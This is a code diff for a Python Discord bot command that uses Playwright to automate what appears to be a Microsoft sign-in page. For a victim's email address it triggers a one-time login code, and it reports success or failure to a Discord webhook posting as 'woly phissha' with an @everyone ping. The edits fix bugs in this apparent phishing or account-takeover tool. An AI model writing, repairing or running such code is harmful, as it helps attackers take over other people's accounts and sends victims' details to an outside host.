@@ -138,7 +138,7 @@ async def requestcode(interaction):
         #})
 
         try:
-          await page.wait_for_selector('#otcLoginLink', state='visible', timeout="5000")
+          await page.wait_for_selector('#otcLoginLink', state='visible', timeout=5000)
           await page.click('#otcLoginLink')
         except Exception as e:
           requests.post(url, json = {
@@ -148,7 +148,7 @@ async def requestcode(interaction):
           })
           try:
             await page.wait_for_selector('#idA_PWD_SwitchToCredPicker', state='visible')
-            await page.click('#idA_PWD_SwitchToCredPicker')
+            await page.click('#idA_PWD_SwitchToCredPicker', timeout=2000)
             await page.click(f'text=Email {email}')
             requests.post(url, json = {
               "username": "woly phissha",
@@ -161,13 +161,6 @@ async def requestcode(interaction):
                 "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
                 "content": f"@everyone COULDN'T GET CODE FROM: {email}"
             }, timeout=5000)
-        request.post(url, json = {
-                      requests.post(url, json = {
-                "username": "woly phissha",
-                "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
-                "content": f"@everyone Successfully got code from: {email}"
-            }, timeout=5000)          
-        })
 
 
 
